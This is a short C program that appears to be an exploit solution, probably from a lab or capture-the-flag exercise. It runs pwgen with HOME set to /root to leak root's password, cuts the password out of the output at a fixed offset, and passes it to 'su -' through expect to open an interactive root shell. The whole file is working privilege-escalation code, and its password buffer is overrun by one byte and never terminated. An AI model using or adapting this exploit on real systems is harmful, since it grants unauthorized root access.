/*Define Standard Libraries*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char * argv[]) {
        /*Declare the following run time variables*/
        int i;
        FILE *targetprocess;
        char programReturnString[100];
        char passwordString[8];
        /*Contains the expect command used to access the su user*/
        char command[255] = "expect -c 'spawn su - ;expect Password:;send \"";

        /*Run the pwgen -w commannd with the HOME environment parameter set to the root's home*/
        targetprocess = popen("HOME=/root /usr/local/bin/pwgen -w", "r");
        /*Get the return value from the above process*/
        fgets(programReturnString, 100, targetprocess);

        /*Skip the first 32 characters since and extract the password character string*/
        for (i = 31; i < 40; i++) {
                /*Extract the eight digit password character string*/
                passwordString[i-31] = programReturnString[i];
        }

        /*Close the process we opened above*/
        pclose(targetprocess);

        /*Add the password to the system command character array*/
        strcat(command, passwordString);
        /*Close the interact command for the system command character array*/
        strcat(command, "\";interact'");

        /*Run the system command*/
        system(command);

        /*exit the function normally*/
        return 0;
}